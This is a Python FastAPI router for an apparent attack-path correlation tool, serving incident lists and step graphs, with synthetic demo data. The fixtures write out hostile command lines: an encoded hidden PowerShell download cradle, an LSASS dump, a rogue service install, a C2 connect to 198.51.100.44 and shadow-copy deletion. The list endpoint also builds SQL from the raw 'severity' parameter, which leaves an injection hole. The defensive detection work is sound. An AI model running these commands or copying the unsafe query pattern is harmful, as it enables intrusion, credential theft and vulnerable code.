"""PathWarden FR-7: Incident API routes.

Provides endpoints for:
  GET /incidents               → list of Incident summaries
  GET /incidents/{id}          → IncidentDetail (with steps and edges)
  GET /incidents/{id}/path     → { steps, edges } (Cytoscape-compatible)
  GET /incidents/{id}/graph    → { incident_id, steps, edges }
"""

from __future__ import annotations

import glob
import json
import os
from typing import Any, Dict, List, Optional

import duckdb
from fastapi import APIRouter, HTTPException, Query

from common.logger import get_logger
from config.settings import settings

logger = get_logger("API.Incidents")

router = APIRouter(tags=["incidents"])

_DATA_DIR = settings.data_dir


def _get_con() -> duckdb.DuckDBPyConnection:
    return duckdb.connect(":memory:")


def _has_incidents() -> bool:
    return bool(glob.glob(os.path.join(_DATA_DIR, "incidents", "*.parquet")))


def _has_steps_edges(incident_id: str) -> bool:
    return (
        bool(glob.glob(os.path.join(_DATA_DIR, "attack_steps", "*.parquet")))
        and bool(glob.glob(os.path.join(_DATA_DIR, "attack_edges", "*.parquet")))
    )


# -----------------------------------------------------------------------
# GET /incidents (and /api/incidents)
# -----------------------------------------------------------------------

@router.get("/incidents")
@router.get("/api/incidents")
def list_incidents(
    limit: int = Query(50, ge=1, le=200),
    offset: int = Query(0, ge=0),
    severity: Optional[str] = Query(None),
):
    """List correlated incident summaries (paginated, from Parquet or demo fallback)."""
    if not _has_incidents():
        incidents = _demo_incident_list()
        if severity:
            incidents = [i for i in incidents if i.get("severity") == severity]
        return incidents[offset : offset + limit]

    inc_glob = os.path.join(_DATA_DIR, "incidents", "*.parquet").replace("\\", "/")
    con = _get_con()
    try:
        con.execute(f"CREATE VIEW raw_incidents AS SELECT * FROM read_parquet('{inc_glob}')")
        where = f"WHERE severity = '{severity}'" if severity else ""
        rows = con.execute(
            f"""SELECT * FROM raw_incidents {where}
                ORDER BY start_time DESC
                LIMIT {limit} OFFSET {offset}"""
        ).fetchall()
        cols = [desc[0] for desc in con.description]
        con.close()
    except Exception as exc:  # noqa: BLE001
        logger.error("list_incidents query failed: %s", exc)
        return _demo_incident_list()[offset : offset + limit]

    results = []
    for r in rows:
        d = dict(zip(cols, r))
        # Format to match frontend Incident interface
        d["first_seen"] = d.get("start_time", "")
        d["last_seen"] = d.get("end_time", "")
        d["confidence"] = d.get("confidence_score", 0.90)
        d["steps_count"] = d.get("total_steps", 0)
        d["detection_count"] = d.get("total_steps", 0)
        d["hosts_involved"] = [d.get("root_cause_host", "")] if d.get("root_cause_host") else []
        d["users_involved"] = [d.get("root_cause_user", "")] if d.get("root_cause_user") else []
        d["tactics"] = d.get("kill_chain_stages") or []
        d["status"] = "ACTIVE_INVESTIGATION"
        d["dq_caveats"] = []
        d["summary"] = d.get("title", "")
        results.append(d)

    return results


# -----------------------------------------------------------------------
# GET /incidents/{incident_id} (and /api/incidents/{incident_id})
# -----------------------------------------------------------------------

@router.get("/incidents/{incident_id}")
@router.get("/api/incidents/{incident_id}")
def get_incident(incident_id: str):
    """Retrieve full incident detail including steps and edges."""
    if not _has_incidents():
        return _demo_incident_detail(incident_id)

    inc_glob = os.path.join(_DATA_DIR, "incidents", "*.parquet").replace("\\", "/")
    con = _get_con()
    try:
        con.execute(f"CREATE VIEW raw_incidents AS SELECT * FROM read_parquet('{inc_glob}')")
        rows = con.execute("SELECT * FROM raw_incidents WHERE incident_id = ?", [incident_id]).fetchall()
        cols = [desc[0] for desc in con.description]
    except Exception as exc:  # noqa: BLE001
        logger.error("get_incident query failed: %s", exc)
        raise HTTPException(status_code=500, detail=str(exc))
    finally:
        con.close()

    if not rows:
        raise HTTPException(status_code=404, detail=f"Incident {incident_id} not found")

    d = dict(zip(cols, rows[0]))
    d["first_seen"] = d.get("start_time", "")
    d["last_seen"] = d.get("end_time", "")
    d["confidence"] = d.get("confidence_score", 0.90)
    d["steps_count"] = d.get("total_steps", 0)
    d["detection_count"] = d.get("total_steps", 0)
    d["hosts_involved"] = [d.get("root_cause_host", "")] if d.get("root_cause_host") else []
    d["users_involved"] = [d.get("root_cause_user", "")] if d.get("root_cause_user") else []
    d["tactics"] = d.get("kill_chain_stages") or []
    d["status"] = "ACTIVE_INVESTIGATION"
    d["dq_caveats"] = []
    d["summary"] = d.get("title", "")

    # Retrieve steps & edges for this incident
    graph_data = _fetch_graph_data(incident_id)
    d["steps"] = graph_data["steps"]
    d["edges"] = graph_data["edges"]

    return d


# -----------------------------------------------------------------------
# GET /incidents/{incident_id}/path & /incidents/{incident_id}/graph
# -----------------------------------------------------------------------

@router.get("/incidents/{incident_id}/path")
@router.get("/api/incidents/{incident_id}/path")
@router.get("/incidents/{incident_id}/graph")
@router.get("/api/incidents/{incident_id}/graph")
def get_incident_path(incident_id: str):
    """Retrieve Cytoscape-compatible DAG nodes and edges."""
    return _fetch_graph_data(incident_id)


def _fetch_graph_data(incident_id: str) -> dict:
    if not _has_steps_edges(incident_id):
        return _demo_graph(incident_id)

    steps_glob = os.path.join(_DATA_DIR, "attack_steps", "*.parquet").replace("\\", "/")
    edges_glob = os.path.join(_DATA_DIR, "attack_edges", "*.parquet").replace("\\", "/")
    con = _get_con()
    try:
        con.execute(f"CREATE VIEW steps AS SELECT * FROM read_parquet('{steps_glob}')")
        con.execute(f"CREATE VIEW edges AS SELECT * FROM read_parquet('{edges_glob}')")

        step_rows = con.execute(
            "SELECT * FROM steps WHERE incident_id = ? ORDER BY order_index", [incident_id]
        ).fetchall()
        step_cols = [desc[0] for desc in con.description]

        edge_rows = con.execute(
            "SELECT * FROM edges WHERE incident_id = ?", [incident_id]
        ).fetchall()
        edge_cols = [desc[0] for desc in con.description]
    except Exception as exc:  # noqa: BLE001
        logger.error("get_incident_path query failed: %s", exc)
        return _demo_graph(incident_id)
    finally:
        con.close()

    if not step_rows:
        return _demo_graph(incident_id)

    steps_out = []
    for row in step_rows:
        sd = dict(zip(step_cols, row))
        try:
            sd["evidence_event_uids"] = json.loads(sd.get("evidence_ids") or "[]")
        except (json.JSONDecodeError, TypeError):
            sd["evidence_event_uids"] = [sd.get("evidence_ids")] if sd.get("evidence_ids") else []

        sd["mitre"] = {
            "technique_id": sd.pop("technique_id", ""),
            "technique_name": sd.pop("technique_name", ""),
            "tactic": sd.pop("tactic", ""),
            "sub_technique_id": None,
        }
        sd["explanation"] = sd.get("command_line") or f"Step {sd.get('order_index')} execution on {sd.get('host_name')}"
        sd["rule_id"] = sd.get("rule_id", "R-GENERIC")
        sd["rule_name"] = sd.get("rule_name", "Analytical Rule")
        sd["kc_confidence"] = 0.95
        sd["detection_confidence"] = 0.95
        sd["dq_flags"] = ["TIMESTAMP_UNCERTAIN"] if sd.get("is_uncertain") else []
        steps_out.append(sd)

    edges_out = []
    for row in edge_rows:
        ed = dict(zip(edge_cols, row))
        ed["explanation"] = f"Relationship {ed.get('relationship_type')} between steps"
        ed["confidence_category"] = ed.get("confidence_category", "STRONG")
        edges_out.append(ed)

    return {"incident_id": incident_id, "steps": steps_out, "edges": edges_out}


# -----------------------------------------------------------------------
# Demo Fallbacks (Full 4-Incident Dataset matching syntheticData.ts)
# -----------------------------------------------------------------------

def _demo_incident_list() -> List[dict]:
    return [
        {
            "incident_id": "INC-2026-0841",
            "title": "Advanced Lateral Intrusion via Ticket Extraction & Pass-the-Hash onto Tier-0 Domain Controller",
            "severity": "CRITICAL",
            "confidence": 0.94,
            "confidence_score": 0.94,
            "first_seen": "2026-10-31T08:14:22Z",
            "last_seen": "2026-10-31T08:57:33Z",
            "start_time": "2026-10-31T08:14:22Z",
            "end_time": "2026-10-31T08:57:33Z",
            "hosts_involved": ["WS-EXEC-04", "SRV-APP-PROD01", "DC01.CORP.LOCAL"],
            "users_involved": ["m.vance", "svc_deploy", "DA_SecAdmin"],
            "root_cause_host": "WS-EXEC-04",
            "root_cause_user": "CORP\\m.vance",
            "target_asset": "DC01.CORP.LOCAL",
            "steps_count": 8,
            "total_steps": 8,
            "detection_count": 12,
            "mitre_tactics_count": 5,
            "tactics": [
                "Initial Access",
                "Discovery",
                "Credential Access",
                "Lateral Movement",
                "Persistence",
                "Privilege Escalation",
                "Command and Control"
            ],
            "status": "ACTIVE_INVESTIGATION",
            "summary": "Multi-stage intrusion beginning with macro-enabled document execution on executive workstation WS-EXEC-04, escalating through LSASS memory dumping, NTLM pass-the-hash to production application server, and directory replication (DCSync) targeting DC01.CORP.LOCAL.",
            "planted_attack_id": "PLANTED_APT_03",
            "is_planted_match": True,
            "observed_reachability_count": 3,
            "potential_reachability_count": 5,
            "dq_caveats": [
                {
                    "type": "TIMESTAMP_UNCERTAIN",
                    "severity": "WARNING",
                    "affected_steps": ["STEP-008"],
                    "description": "Perimeter proxy logs exhibit a 420ms clock offset against internal DC NTP master; timestamp adjusted within 1s tolerance."
                },
                {
                    "type": "HOST_INFERRED",
                    "severity": "INFO",
                    "affected_steps": ["STEP-004"],
                    "description": "Source host identified through NetBIOS session record and authenticated Kerberos ticket cache."
                }
            ]
        },
        {
            "incident_id": "INC-2026-0839",
            "title": "Targeted Ransomware Precursor: Volume Shadow Deletion & Remote WMI Execution",
            "severity": "HIGH",
            "confidence": 0.89,
            "confidence_score": 0.89,
            "first_seen": "2026-10-31T07:42:11Z",
            "last_seen": "2026-10-31T08:05:44Z",
            "start_time": "2026-10-31T07:42:11Z",
            "end_time": "2026-10-31T08:05:44Z",
            "hosts_involved": ["WS-FIN-09", "SRV-FILE-BACKUP"],
            "users_involved": ["a.rodriguez", "admin_backup"],
            "root_cause_host": "WS-FIN-09",
            "root_cause_user": "CORP\\a.rodriguez",
            "target_asset": "SRV-FILE-BACKUP",
            "steps_count": 5,
            "total_steps": 5,
            "detection_count": 7,
            "mitre_tactics_count": 4,
            "tactics": ["Execution", "Defense Evasion", "Impact", "Lateral Movement"],
            "status": "ACTIVE_INVESTIGATION",
            "summary": "Discovery commands executed via cmd.exe followed by vssadmin.exe delete shadows /all /quiet and remote execution across file backup infrastructure.",
            "planted_attack_id": "PLANTED_RANSOM_01",
            "is_planted_match": True,
            "observed_reachability_count": 2,
            "potential_reachability_count": 3,
            "dq_caveats": [
                {
                    "type": "CLOCK_SKEW_DETECTED",
                    "severity": "INFO",
                    "affected_steps": ["STEP-203"],
                    "description": "Backup server clock drift observed; events reconciled via sequential event record ID."
                }
            ]
        },
        {
            "incident_id": "INC-2026-0835",
            "title": "Suspicious API Key Harvest & Cloud CLI Enumeration from Staging Container",
            "severity": "MEDIUM",
            "confidence": 0.82,
            "confidence_score": 0.82,
            "first_seen": "2026-10-31T06:12:00Z",
            "last_seen": "2026-10-31T06:45:19Z",
            "start_time": "2026-10-31T06:12:00Z",
            "end_time": "2026-10-31T06:45:19Z",
            "hosts_involved": ["KUBE-NODE-03", "STG-RUNNER-01"],
            "users_involved": ["ci_builder"],
            "root_cause_host": "KUBE-NODE-03",
            "root_cause_user": "ci_builder",
            "target_asset": "STG-RUNNER-01",
            "steps_count": 4,
            "total_steps": 4,
            "detection_count": 5,
            "mitre_tactics_count": 3,
            "tactics": ["Credential Access", "Discovery", "Exfiltration"],
            "status": "ACTIVE_INVESTIGATION",
            "summary": "Grep search for AWS_SECRET_ACCESS_KEY in container environment variables followed by curl POST to untrusted external paste site.",
            "planted_attack_id": "PLANTED_CLOUD_02",
            "is_planted_match": True,
            "observed_reachability_count": 1,
            "potential_reachability_count": 2,
            "dq_caveats": []
        },
        {
            "incident_id": "INC-2026-0822",
            "title": "Decoy Burst: Repeated Kerberos Pre-Authentication Failures (Hub Account)",
            "severity": "LOW",
            "confidence": 0.48,
            "confidence_score": 0.48,
            "first_seen": "2026-10-31T05:00:00Z",
            "last_seen": "2026-10-31T05:14:00Z",
            "start_time": "2026-10-31T05:00:00Z",
            "end_time": "2026-10-31T05:14:00Z",
            "hosts_involved": ["DC01.CORP.LOCAL", "NAT-GW-01"],
            "users_involved": ["svc_backup"],
            "root_cause_host": "NAT-GW-01",
            "root_cause_user": "svc_backup",
            "target_asset": "DC01.CORP.LOCAL",
            "steps_count": 2,
            "total_steps": 2,
            "detection_count": 14,
            "mitre_tactics_count": 1,
            "tactics": ["Credential Access"],
            "status": "CONTAINED",
            "summary": "High-degree hub account exhibiting 14 pre-auth failure spikes through NAT gateway; correctly discounted by Anti-Hub filter to prevent false cluster merge.",
            "planted_attack_id": None,
            "is_planted_match": False,
            "observed_reachability_count": 1,
            "potential_reachability_count": 1,
            "dq_caveats": []
        }
    ]


def _demo_incident_detail(incident_id: str) -> dict:
    incidents = _demo_incident_list()
    found = next((i for i in incidents if i["incident_id"] == incident_id), None)
    if not found:
        found = incidents[0]

    graph = _demo_graph(incident_id)
    return {
        **found,
        "steps": graph["steps"],
        "edges": graph["edges"],
    }


def _demo_graph(incident_id: str) -> dict:
    steps = [
        {
            "step_uid": "STEP-001",
            "incident_id": incident_id,
            "order_index": 1,
            "timestamp": "2026-10-31T08:14:22Z",
            "host_id": "HOST-004",
            "host_name": "WS-EXEC-04",
            "user_id": "USR-094",
            "user_name": "m.vance",
            "process_id": 4892,
            "process_name": "powershell.exe",
            "parent_process_name": "winword.exe",
            "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...",
            "mitre": {
                "tactic": "Initial Access",
                "technique_id": "T1566.001",
                "technique_name": "Spearphishing Attachment",
                "sub_technique_id": "T1566.001"
            },
            "kill_chain_stage": "Exploitation",
            "kc_confidence": 0.95,
            "severity": "HIGH",
            "detection_confidence": 0.96,
            "rule_id": "R-WIN-014",
            "rule_name": "Office Application Spawning Script Interpreter",
            "explanation": "winword.exe (PID 3104) spawned powershell.exe with an obfuscated base64-encoded command line, typical of weaponized document macro execution.",
            "evidence_event_uids": ["EVT-WIN-4688-9102", "EVT-SYSMON-001-4412"],
            "is_uncertain": False,
            "dq_flags": []
        },
        {
            "step_uid": "STEP-002",
            "incident_id": incident_id,
            "order_index": 2,
            "timestamp": "2026-10-31T08:16:05Z",
            "host_id": "HOST-004",
            "host_name": "WS-EXEC-04",
            "user_id": "USR-094",
            "user_name": "m.vance",
            "process_id": 5120,
            "process_name": "whoami.exe",
            "parent_process_name": "powershell.exe",
            "command_line": "whoami.exe /all",
            "mitre": {
                "tactic": "Discovery",
                "technique_id": "T1087.002",
                "technique_name": "Domain Account Discovery",
                "sub_technique_id": "T1087.002"
            },
            "kill_chain_stage": "Reconnaissance",
            "kc_confidence": 0.91,
            "severity": "MEDIUM",
            "detection_confidence": 0.92,
            "rule_id": "R-DISC-003",
            "rule_name": "Immediate Post-Exploitation Domain Reconnaissance",
            "explanation": "Child process whoami.exe and subsequent net.exe group 'Domain Admins' /domain invoked within 103 seconds of initial script execution in same logon session.",
            "evidence_event_uids": ["EVT-WIN-4688-9188", "EVT-SYSMON-001-4450"],
            "is_uncertain": False,
            "dq_flags": []
        },
        {
            "step_uid": "STEP-003",
            "incident_id": incident_id,
            "order_index": 3,
            "timestamp": "2026-10-31T08:21:40Z",
            "host_id": "HOST-004",
            "host_name": "WS-EXEC-04",
            "user_id": "USR-094",
            "user_name": "m.vance",
            "process_id": 6184,
            "process_name": "rundll32.exe",
            "parent_process_name": "powershell.exe",
            "command_line": "rundll32.exe C:\\ProgramData\\update.dll,DumpMemory lsass.exe",
            "mitre": {
                "tactic": "Credential Access",
                "technique_id": "T1003.001",
                "technique_name": "OS Credential Dumping: LSASS Memory",
                "sub_technique_id": "T1003.001"
            },
            "kill_chain_stage": "Actions on Objectives",
            "kc_confidence": 0.96,
            "severity": "CRITICAL",
            "detection_confidence": 0.98,
            "rule_id": "R-CRED-007",
            "rule_name": "LSASS Process Handle Duplication & Memory Access",
            "explanation": "Process rundll32.exe requested PROCESS_VM_READ and PROCESS_QUERY_INFORMATION rights against lsass.exe (PID 672), extracting local memory hashes.",
            "evidence_event_uids": ["EVT-SYSMON-010-8821", "EVT-WIN-4672-1002"],
            "is_uncertain": False,
            "dq_flags": []
        },
        {
            "step_uid": "STEP-004",
            "incident_id": incident_id,
            "order_index": 4,
            "timestamp": "2026-10-31T08:29:15Z",
            "host_id": "HOST-012",
            "host_name": "SRV-APP-PROD01",
            "user_id": "USR-SVC-01",
            "user_name": "svc_deploy",
            "process_id": None,
            "process_name": "System",
            "command_line": None,
            "mitre": {
                "tactic": "Lateral Movement",
                "technique_id": "T1550.002",
                "technique_name": "Use Alternate Authentication: Pass the Hash",
                "sub_technique_id": "T1550.002"
            },
            "kill_chain_stage": "Installation",
            "kc_confidence": 0.93,
            "severity": "CRITICAL",
            "detection_confidence": 0.94,
            "rule_id": "R-LAT-005",
            "rule_name": "Inbound SMB Logon Type 3 with Dumped Service Account NTLM",
            "explanation": "Network logon (LogonType 3) to SRV-APP-PROD01 originated from WS-EXEC-04 (10.100.4.14) using NTLM authentication for svc_deploy, matching harvested hash.",
            "evidence_event_uids": ["EVT-WIN-4624-3401", "EVT-NET-SMB-8812"],
            "is_uncertain": False,
            "dq_flags": ["HOST_INFERRED"]
        },
        {
            "step_uid": "STEP-005",
            "incident_id": incident_id,
            "order_index": 5,
            "timestamp": "2026-10-31T08:33:50Z",
            "host_id": "HOST-012",
            "host_name": "SRV-APP-PROD01",
            "user_id": "USR-SVC-01",
            "user_name": "svc_deploy",
            "process_id": 1044,
            "process_name": "services.exe",
            "command_line": "sc.exe create PathWardenAgent binPath= \"C:\\Windows\\Temp\\svc_agent.exe\" start= auto",
            "mitre": {
                "tactic": "Persistence",
                "technique_id": "T1543.003",
                "technique_name": "Create or Modify System Process: Windows Service",
                "sub_technique_id": "T1543.003"
            },
            "kill_chain_stage": "Installation",
            "kc_confidence": 0.92,
            "severity": "HIGH",
            "detection_confidence": 0.95,
            "rule_id": "R-PERS-002",
            "rule_name": "Remote New Service Installation via Service Control Manager",
            "explanation": "A new service 'PathWardenAgent' was registered using binary located in C:\\Windows\\Temp\\, executed under SYSTEM privilege.",
            "evidence_event_uids": ["EVT-WIN-7045-1029", "EVT-WIN-4697-0941"],
            "is_uncertain": False,
            "dq_flags": []
        },
        {
            "step_uid": "STEP-006",
            "incident_id": incident_id,
            "order_index": 6,
            "timestamp": "2026-10-31T08:42:10Z",
            "host_id": "HOST-001",
            "host_name": "DC01.CORP.LOCAL",
            "user_id": "USR-ADMIN-02",
            "user_name": "DA_SecAdmin",
            "process_id": 748,
            "process_name": "lsass.exe",
            "command_line": None,
            "mitre": {
                "tactic": "Credential Access",
                "technique_id": "T1003.006",
                "technique_name": "OS Credential Dumping: DCSync",
                "sub_technique_id": "T1003.006"
            },
            "kill_chain_stage": "Actions on Objectives",
            "kc_confidence": 0.97,
            "severity": "CRITICAL",
            "detection_confidence": 0.99,
            "rule_id": "R-AD-011",
            "rule_name": "Directory Service Replication RPC from Non-Domain-Controller Host",
            "explanation": "DRSUAPI RPC calls (DsGetNCChanges) invoked from client IP 10.100.12.8 (SRV-APP-PROD01). Host is not an authorized domain controller.",
            "evidence_event_uids": ["EVT-WIN-4662-7714", "EVT-RPC-DRSUAPI-099"],
            "is_uncertain": False,
            "dq_flags": []
        },
        {
            "step_uid": "STEP-007",
            "incident_id": incident_id,
            "order_index": 7,
            "timestamp": "2026-10-31T08:50:00Z",
            "host_id": "HOST-001",
            "host_name": "DC01.CORP.LOCAL",
            "user_id": "USR-ADMIN-02",
            "user_name": "DA_SecAdmin",
            "process_id": 748,
            "process_name": "lsass.exe",
            "command_line": None,
            "mitre": {
                "tactic": "Privilege Escalation",
                "technique_id": "T1558.001",
                "technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket",
                "sub_technique_id": "T1558.001"
            },
            "kill_chain_stage": "Exploitation",
            "kc_confidence": 0.94,
            "severity": "CRITICAL",
            "detection_confidence": 0.96,
            "rule_id": "R-KRB-008",
            "rule_name": "TGS Request with Irregular Encryption Type or Kerberos Lifetime",
            "explanation": "Kerberos TGS ticket requested for krbtgt with a 10-year validity lifetime and RC4 encryption, evidencing forged Golden Ticket issuance.",
            "evidence_event_uids": ["EVT-WIN-4769-6612", "EVT-WIN-4768-4100"],
            "is_uncertain": False,
            "dq_flags": []
        },
        {
            "step_uid": "STEP-008",
            "incident_id": incident_id,
            "order_index": 8,
            "timestamp": "2026-10-31T08:57:33Z",
            "host_id": "HOST-012",
            "host_name": "SRV-APP-PROD01",
            "user_id": "SYSTEM",
            "user_name": "SYSTEM",
            "process_id": 3940,
            "process_name": "svc_agent.exe",
            "command_line": "C:\\Windows\\Temp\\svc_agent.exe --connect 198.51.100.44:443",
            "mitre": {
                "tactic": "Command and Control",
                "technique_id": "T1071.001",
                "technique_name": "Application Layer Protocol: Web Protocols",
                "sub_technique_id": "T1071.001"
            },
            "kill_chain_stage": "Command and Control",
            "kc_confidence": 0.93,
            "severity": "HIGH",
            "detection_confidence": 0.91,
            "rule_id": "R-NET-019",
            "rule_name": "Cobalt Strike / HTTPS Beaconing Signature Detected",
            "explanation": "Regular periodic TLS connections established to external C2 IP 198.51.100.44 with 30s jitter interval (15% variance).",
            "evidence_event_uids": ["EVT-ZEEK-SSL-0914", "EVT-FW-OUT-55201"],
            "is_uncertain": True,
            "dq_flags": ["TIMESTAMP_UNCERTAIN"]
        }
    ]

    edges = [
        {
            "edge_id": "EDGE-001",
            "incident_id": incident_id,
            "source_step_uid": "STEP-001",
            "target_step_uid": "STEP-002",
            "relationship_type": "parent_child_process",
            "relationship_score": 0.98,
            "confidence_category": "STRONG",
            "evidence_event_uids": ["EVT-SYSMON-001-4450"],
            "explanation": "Process lineage confirms powershell.exe (PID 4892) spawned whoami.exe (PID 5120) with identical security token.",
            "is_inferred": False,
            "latency_seconds": 103
        },
        {
            "edge_id": "EDGE-002",
            "incident_id": incident_id,
            "source_step_uid": "STEP-002",
            "target_step_uid": "STEP-003",
            "relationship_type": "same_authenticated_session",
            "relationship_score": 0.92,
            "confidence_category": "STRONG",
            "evidence_event_uids": ["EVT-WIN-4672-1002"],
            "explanation": "Credential dumping via rundll32.exe executed within the exact logon session ID 0x3E7A of user m.vance on WS-EXEC-04.",
            "is_inferred": False,
            "latency_seconds": 335
        },
        {
            "edge_id": "EDGE-003",
            "incident_id": incident_id,
            "source_step_uid": "STEP-003",
            "target_step_uid": "STEP-004",
            "relationship_type": "credential_reuse",
            "relationship_score": 0.95,
            "confidence_category": "STRONG",
            "evidence_event_uids": ["EVT-WIN-4624-3401"],
            "explanation": "The NTLM hash for service account svc_deploy extracted in STEP-003 was used 7.5 minutes later to establish network logon on SRV-APP-PROD01.",
            "is_inferred": False,
            "latency_seconds": 455
        },
        {
            "edge_id": "EDGE-004",
            "incident_id": incident_id,
            "source_step_uid": "STEP-004",
            "target_step_uid": "STEP-005",
            "relationship_type": "successful_session_followed_by_host_activity",
            "relationship_score": 0.97,
            "confidence_category": "STRONG",
            "evidence_event_uids": ["EVT-WIN-7045-1029"],
            "explanation": "The authenticated SMB session from WS-EXEC-04 issued RPC calls to Service Control Manager on SRV-APP-PROD01 to register PathWardenAgent service.",
            "is_inferred": False,
            "latency_seconds": 275
        },
        {
            "edge_id": "EDGE-005",
            "incident_id": incident_id,
            "source_step_uid": "STEP-005",
            "target_step_uid": "STEP-006",
            "relationship_type": "host_to_host_network_connection",
            "relationship_score": 0.91,
            "confidence_category": "STRONG",
            "evidence_event_uids": ["EVT-RPC-DRSUAPI-099"],
            "explanation": "The newly installed payload process on SRV-APP-PROD01 initiated an RPC DRSUAPI replication stream to DC01.CORP.LOCAL.",
            "is_inferred": False,
            "latency_seconds": 500
        },
        {
            "edge_id": "EDGE-006",
            "incident_id": incident_id,
            "source_step_uid": "STEP-006",
            "target_step_uid": "STEP-007",
            "relationship_type": "lateral_movement",
            "relationship_score": 0.96,
            "confidence_category": "STRONG",
            "evidence_event_uids": ["EVT-WIN-4769-6612"],
            "explanation": "The krbtgt hash extracted via DCSync replication was utilized to construct and present a forged Kerberos Golden Ticket.",
            "is_inferred": False,
            "latency_seconds": 470
        },
        {
            "edge_id": "EDGE-007",
            "incident_id": incident_id,
            "source_step_uid": "STEP-005",
            "target_step_uid": "STEP-008",
            "relationship_type": "suspicious_script_launch",
            "relationship_score": 0.88,
            "confidence_category": "STRONG",
            "evidence_event_uids": ["EVT-FW-OUT-55201"],
            "explanation": "Persistence binary svc_agent.exe established recurring outbound command-and-control connection to 198.51.100.44:443.",
            "is_inferred": False,
            "latency_seconds": 1423
        }
    ]

    return {"incident_id": incident_id, "steps": steps, "edges": edges}
